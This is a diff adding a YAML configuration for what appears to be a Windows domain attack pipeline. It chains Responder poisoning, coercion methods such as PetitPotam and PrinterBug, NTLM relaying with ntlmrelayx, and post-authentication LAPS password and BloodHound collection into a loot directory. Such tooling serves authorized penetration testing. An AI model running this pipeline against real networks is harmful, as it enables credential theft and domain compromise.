@@ -1,0 +1,91 @@
+project_name: "btc-relay-module-nxc-impckt"
+log_level: "INFO"
+output_jsonl: "sessions.jsonl"
+
+# Docker settings
+docker:
+  impacket_image: "btc-relay/impacket:latest"
+  netexec_image: "btc-relay/netexec:latest"
+  responder_image: "btc-relay/responder:latest"
+  network_mode: "host"
+  loot_dir: "./loot"
+  logs_dir: "./logs"
+  responder_config_dir: "./responder"
+
+# ntlmrelayx core relay engine
+ntlmrelayx:
+  enabled: true
+  interface_ip: "0.0.0.0"
+  smb_port: 445
+  http_port: 80
+  # Target file or single target for relay
+  targets_file: "./targets_relay.txt"
+  # Command to execute on successful relay (optional)
+  command: null
+  # SMB2 support
+  smb2support: true
+  # SOCKS proxy
+  socks: false
+  socks_port: 1080
+  # Keep relaying after success
+  keep_relaying: true
+
+# Passive poisoning via Responder
+responder:
+  enabled: true
+  interface: "eth0"
+  wpad: true
+  dns: true
+
+# Coercion phase
+coerce:
+  enabled: true
+  # nxc coerce_plus methods: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven
+  # Use 'coerce_plus' or 'all' to let nxc try every method.
+  methods:
+    - "coerce_plus"
+  targets:
+    - "192.168.1.10"
+    - "192.168.1.11"
+  # Listener callback exposed to coerced targets (our host IP)
+  callback_host: "192.168.1.5"
+  # Run all coerce methods even if one already succeeded
+  always: false
+  delay_between: 5.0
+  workers: 4
+
+# Post-auth actions via nxc
+post_auth:
+  enabled: true
+  # For each successful relay, run these nxc modules/protocols
+  protocols:
+    smb:
+      enabled: true
+      commands:
+        - "--shares"
+        - "--users"
+      modules: []
+    ldap:
+      enabled: true
+      commands:
+        - "--users"
+      modules:
+        - "laps"
+        - "bloodhound"
+    winrm:
+      enabled: false
+      commands: []
+      modules: []
+    mssql:
+      enabled: false
+      commands: []
+      modules: []
+    ssh:
+      enabled: false
+      commands: []
+      modules: []
+    rdp:
+      enabled: false
+      commands: []
+      modules: []
+  workers: 4
